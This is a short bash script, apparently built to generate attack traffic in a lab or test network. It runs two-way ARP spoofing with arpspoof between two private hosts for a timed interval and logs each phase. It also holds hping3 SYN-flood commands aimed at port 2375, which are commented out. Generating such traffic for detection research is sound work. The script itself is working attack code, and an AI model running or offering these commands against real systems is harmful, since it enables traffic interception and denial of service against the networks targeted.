#!/bin/bash

LOGFILE="/attacks/logs/attacks.log"
TARGET_IP="172.25.0.20"
TARGET2_IP="172.25.0.21"
IFACE="eth0"

SYN_TIME=20
ARP_TIME=40
PAUSE=60

mkdir -p "$(dirname "$LOGFILE")"

sleep 15
echo "[$(date)] Attack start" >> "$LOGFILE"

# ---- ARP SPOOFING (fase 2) ----
echo "[$(date)] ARP spoofing start" >> "$LOGFILE"
timeout ${ARP_TIME}s arpspoof -i "$IFACE" -t "$TARGET_IP"  "$TARGET2_IP" >>"$LOGFILE" 2>&1 &
PID1=$!
timeout ${ARP_TIME}s arpspoof -i "$IFACE" -t "$TARGET2_IP" "$TARGET_IP"  >>"$LOGFILE" 2>&1 &
PID2=$!

wait $PID1 $PID2
echo "[$(date)] ARP spoofing end" >> "$LOGFILE"


# --- SYN FLOOD DOS ---
echo "[$(date)] SYN flood start" >> "$LOGFILE"
#timeout 15s hping3 -S --flood -p 2375 "$TARGET_IP" >>"$LOGFILE" 2>&1
#timeout 15s hping3 --flood -S -p 2375 "$TARGET_IP"> /dev/null 2>&1

echo "[$(date)] SYN flood end" >> "$LOGFILE"

echo "[$(date)] Attack end" >> "$LOGFILE"
